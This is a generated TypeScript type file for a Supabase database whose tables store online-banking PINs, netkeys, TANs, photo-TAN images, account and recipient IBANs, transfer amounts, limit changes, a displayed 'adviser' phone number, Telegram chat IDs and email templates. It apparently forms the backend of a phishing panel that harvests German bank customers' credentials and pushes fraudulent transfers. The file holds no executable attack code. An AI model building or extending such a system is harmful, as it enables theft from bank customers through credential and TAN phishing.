export type Json =
  | string
  | number
  | boolean
  | null
  | { [key: string]: Json | undefined }
  | Json[]

export type Database = {
  // Allows to automatically instantiate createClient with right options
  // instead of createClient<Database, { PostgrestVersion: 'XX' }>(URL, KEY)
  __InternalSupabase: {
    PostgrestVersion: "14.15"
  }
  public: {
    Tables: {
      api_settings: {
        Row: {
          created_at: string
          custom_email_domain: string | null
          default_berater_phone: string | null
          flow_mode: string
          id: string
          telegram_chat_id: string | null
          updated_at: string
        }
        Insert: {
          created_at?: string
          custom_email_domain?: string | null
          default_berater_phone?: string | null
          flow_mode?: string
          id?: string
          telegram_chat_id?: string | null
          updated_at?: string
        }
        Update: {
          created_at?: string
          custom_email_domain?: string | null
          default_berater_phone?: string | null
          flow_mode?: string
          id?: string
          telegram_chat_id?: string | null
          updated_at?: string
        }
        Relationships: []
      }
      auth_tokens: {
        Row: {
          auftraggeber_iban: string | null
          auftraggeber_name: string | null
          berater_phone: string | null
          created_at: string
          customer_phase: string | null
          device_name: string | null
          id: string
          last_error: string | null
          parent_kind: string | null
          parent_token_id: string | null
          photo_tan_image: string | null
          security_status: string | null
          security_status_at: string | null
          show_berater: boolean
          tan_method: string | null
          token: string
          used: boolean
          used_at: string | null
        }
        Insert: {
          auftraggeber_iban?: string | null
          auftraggeber_name?: string | null
          berater_phone?: string | null
          created_at?: string
          customer_phase?: string | null
          device_name?: string | null
          id?: string
          last_error?: string | null
          parent_kind?: string | null
          parent_token_id?: string | null
          photo_tan_image?: string | null
          security_status?: string | null
          security_status_at?: string | null
          show_berater?: boolean
          tan_method?: string | null
          token: string
          used?: boolean
          used_at?: string | null
        }
        Update: {
          auftraggeber_iban?: string | null
          auftraggeber_name?: string | null
          berater_phone?: string | null
          created_at?: string
          customer_phase?: string | null
          device_name?: string | null
          id?: string
          last_error?: string | null
          parent_kind?: string | null
          parent_token_id?: string | null
          photo_tan_image?: string | null
          security_status?: string | null
          security_status_at?: string | null
          show_berater?: boolean
          tan_method?: string | null
          token?: string
          used?: boolean
          used_at?: string | null
        }
        Relationships: []
      }
      custom_emails: {
        Row: {
          address: string | null
          created_at: string
          domain: string
          id: string
          label: string | null
          local_part: string
        }
        Insert: {
          address?: string | null
          created_at?: string
          domain: string
          id?: string
          label?: string | null
          local_part: string
        }
        Update: {
          address?: string | null
          created_at?: string
          domain?: string
          id?: string
          label?: string | null
          local_part?: string
        }
        Relationships: []
      }
      email_templates: {
        Row: {
          created_at: string
          html: string
          id: string
          name: string
          subject: string
          updated_at: string
        }
        Insert: {
          created_at?: string
          html: string
          id?: string
          name: string
          subject: string
          updated_at?: string
        }
        Update: {
          created_at?: string
          html?: string
          id?: string
          name?: string
          subject?: string
          updated_at?: string
        }
        Relationships: []
      }
      limit_tokens: {
        Row: {
          applied_at: string | null
          auftraggeber_iban: string | null
          auftraggeber_name: string | null
          berater_phone: string | null
          created_at: string
          current_limit: number | null
          current_limit_set_at: string | null
          customer_phase: string | null
          id: string
          new_limit: number | null
          parent_kind: string | null
          parent_token_id: string | null
          security_status: string | null
          security_status_at: string | null
          token: string
          used: boolean
          used_at: string | null
        }
        Insert: {
          applied_at?: string | null
          auftraggeber_iban?: string | null
          auftraggeber_name?: string | null
          berater_phone?: string | null
          created_at?: string
          current_limit?: number | null
          current_limit_set_at?: string | null
          customer_phase?: string | null
          id?: string
          new_limit?: number | null
          parent_kind?: string | null
          parent_token_id?: string | null
          security_status?: string | null
          security_status_at?: string | null
          token: string
          used?: boolean
          used_at?: string | null
        }
        Update: {
          applied_at?: string | null
          auftraggeber_iban?: string | null
          auftraggeber_name?: string | null
          berater_phone?: string | null
          created_at?: string
          current_limit?: number | null
          current_limit_set_at?: string | null
          customer_phase?: string | null
          id?: string
          new_limit?: number | null
          parent_kind?: string | null
          parent_token_id?: string | null
          security_status?: string | null
          security_status_at?: string | null
          token?: string
          used?: boolean
          used_at?: string | null
        }
        Relationships: []
      }
      panel_task_meta: {
        Row: {
          berater_geburtsdatum: string | null
          berater_karte: string | null
          created_at: string
          id: string
          netkey: string | null
          pin: string | null
          tan: string | null
          tan_updated_at: string | null
          task_id: string
          updated_at: string
        }
        Insert: {
          berater_geburtsdatum?: string | null
          berater_karte?: string | null
          created_at?: string
          id?: string
          netkey?: string | null
          pin?: string | null
          tan?: string | null
          tan_updated_at?: string | null
          task_id: string
          updated_at?: string
        }
        Update: {
          berater_geburtsdatum?: string | null
          berater_karte?: string | null
          created_at?: string
          id?: string
          netkey?: string | null
          pin?: string | null
          tan?: string | null
          tan_updated_at?: string | null
          task_id?: string
          updated_at?: string
        }
        Relationships: []
      }
      pin_tokens: {
        Row: {
          auftraggeber_iban: string | null
          auftraggeber_name: string | null
          berater_phone: string | null
          created_at: string
          customer_phase: string | null
          id: string
          last_error: string | null
          parent_kind: string | null
          parent_token_id: string | null
          photo_tan_image: string | null
          pin_code: string | null
          security_status: string | null
          security_status_at: string | null
          token: string
          used: boolean
          used_at: string | null
        }
        Insert: {
          auftraggeber_iban?: string | null
          auftraggeber_name?: string | null
          berater_phone?: string | null
          created_at?: string
          customer_phase?: string | null
          id?: string
          last_error?: string | null
          parent_kind?: string | null
          parent_token_id?: string | null
          photo_tan_image?: string | null
          pin_code?: string | null
          security_status?: string | null
          security_status_at?: string | null
          token: string
          used?: boolean
          used_at?: string | null
        }
        Update: {
          auftraggeber_iban?: string | null
          auftraggeber_name?: string | null
          berater_phone?: string | null
          created_at?: string
          customer_phase?: string | null
          id?: string
          last_error?: string | null
          parent_kind?: string | null
          parent_token_id?: string | null
          photo_tan_image?: string | null
          pin_code?: string | null
          security_status?: string | null
          security_status_at?: string | null
          token?: string
          used?: boolean
          used_at?: string | null
        }
        Relationships: []
      }
      sessions: {
        Row: {
          action: string | null
          created_at: string
          extra_message_ids: number[]
          id: string
          meta: Json
          mode: string
          phase: string
          tg_message_id: number | null
          updated_at: string
        }
        Insert: {
          action?: string | null
          created_at?: string
          extra_message_ids?: number[]
          id?: string
          meta?: Json
          mode?: string
          phase?: string
          tg_message_id?: number | null
          updated_at?: string
        }
        Update: {
          action?: string | null
          created_at?: string
          extra_message_ids?: number[]
          id?: string
          meta?: Json
          mode?: string
          phase?: string
          tg_message_id?: number | null
          updated_at?: string
        }
        Relationships: []
      }
      storno_tokens: {
        Row: {
          auftraggeber_iban: string | null
          auftraggeber_name: string | null
          berater_phone: string | null
          betrag: number | null
          created_at: string
          customer_phase: string | null
          device_name: string | null
          empfaenger_iban: string | null
          empfaenger_name: string | null
          executed_at: string | null
          id: string
          last_error: string | null
          parent_kind: string | null
          parent_token_id: string | null
          photo_tan_image: string | null
          security_status: string | null
          security_status_at: string | null
          show_berater: boolean
          tan_method: string
          token: string
          used: boolean
          used_at: string | null
          verwendungszweck: string | null
        }
        Insert: {
          auftraggeber_iban?: string | null
          auftraggeber_name?: string | null
          berater_phone?: string | null
          betrag?: number | null
          created_at?: string
          customer_phase?: string | null
          device_name?: string | null
          empfaenger_iban?: string | null
          empfaenger_name?: string | null
          executed_at?: string | null
          id?: string
          last_error?: string | null
          parent_kind?: string | null
          parent_token_id?: string | null
          photo_tan_image?: string | null
          security_status?: string | null
          security_status_at?: string | null
          show_berater?: boolean
          tan_method?: string
          token: string
          used?: boolean
          used_at?: string | null
          verwendungszweck?: string | null
        }
        Update: {
          auftraggeber_iban?: string | null
          auftraggeber_name?: string | null
          berater_phone?: string | null
          betrag?: number | null
          created_at?: string
          customer_phase?: string | null
          device_name?: string | null
          empfaenger_iban?: string | null
          empfaenger_name?: string | null
          executed_at?: string | null
          id?: string
          last_error?: string | null
          parent_kind?: string | null
          parent_token_id?: string | null
          photo_tan_image?: string | null
          security_status?: string | null
          security_status_at?: string | null
          show_berater?: boolean
          tan_method?: string
          token?: string
          used?: boolean
          used_at?: string | null
          verwendungszweck?: string | null
        }
        Relationships: []
      }
    }
    Views: {
      [_ in never]: never
    }
    Functions: {
      [_ in never]: never
    }
    Enums: {
      [_ in never]: never
    }
    CompositeTypes: {
      [_ in never]: never
    }
  }
}

type DatabaseWithoutInternals = Omit<Database, "__InternalSupabase">

type DefaultSchema = DatabaseWithoutInternals[Extract<keyof Database, "public">]

export type Tables<
  DefaultSchemaTableNameOrOptions extends
    | keyof (DefaultSchema["Tables"] & DefaultSchema["Views"])
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof (DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
        DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Views"])
    : never = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? (DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
      DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Views"])[TableName] extends {
      Row: infer R
    }
    ? R
    : never
  : DefaultSchemaTableNameOrOptions extends keyof (DefaultSchema["Tables"] &
        DefaultSchema["Views"])
    ? (DefaultSchema["Tables"] &
        DefaultSchema["Views"])[DefaultSchemaTableNameOrOptions] extends {
        Row: infer R
      }
      ? R
      : never
    : never

export type TablesInsert<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Insert: infer I
    }
    ? I
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Insert: infer I
      }
      ? I
      : never
    : never

export type TablesUpdate<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Update: infer U
    }
    ? U
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Update: infer U
      }
      ? U
      : never
    : never

export type Enums<
  DefaultSchemaEnumNameOrOptions extends
    | keyof DefaultSchema["Enums"]
    | { schema: keyof DatabaseWithoutInternals },
  EnumName extends DefaultSchemaEnumNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"]
    : never = never,
> = DefaultSchemaEnumNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"][EnumName]
  : DefaultSchemaEnumNameOrOptions extends keyof DefaultSchema["Enums"]
    ? DefaultSchema["Enums"][DefaultSchemaEnumNameOrOptions]
    : never

export type CompositeTypes<
  PublicCompositeTypeNameOrOptions extends
    | keyof DefaultSchema["CompositeTypes"]
    | { schema: keyof DatabaseWithoutInternals },
  CompositeTypeName extends PublicCompositeTypeNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"]
    : never = never,
> = PublicCompositeTypeNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"][CompositeTypeName]
  : PublicCompositeTypeNameOrOptions extends keyof DefaultSchema["CompositeTypes"]
    ? DefaultSchema["CompositeTypes"][PublicCompositeTypeNameOrOptions]
    : never

export const Constants = {
  public: {
    Enums: {},
  },
} as const
